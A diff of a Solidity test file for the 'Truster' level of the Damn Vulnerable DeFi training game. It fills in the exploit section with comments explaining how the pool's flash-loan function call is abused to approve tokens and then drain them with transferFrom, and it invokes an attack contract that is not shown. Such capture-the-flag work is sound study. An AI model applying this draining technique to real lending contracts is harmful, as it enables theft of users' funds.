@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
+import {AttackContract} from "../../../src/Contracts/truster/Attacker.sol";
 
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -14,6 +15,7 @@ contract Truster is Test {
     TrusterLenderPool internal trusterLenderPool;
     DamnValuableToken internal dvt;
     address payable internal attacker;
+    AttackContract internal attackContract;
 
     function setUp() public {
         /**
@@ -41,12 +43,21 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        // 1. attaker take all tokens from pool (probably attack the flashLoan function
+        // 2. 0there is a functionCall in flashLoan function, do something with it
+        // 3. the function check  balanceBefore and balanceAfter
+        // 4. so we use functionCall to do approve, then use transferFrom to do the attack
+        vm.startPrank(attacker);
+        attackContract = new AttackContract();
+        attackContract.attack(address(trusterLenderPool), address(dvt));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
         validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        console.log(
+            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
+        );
     }
 
     function validation() internal {
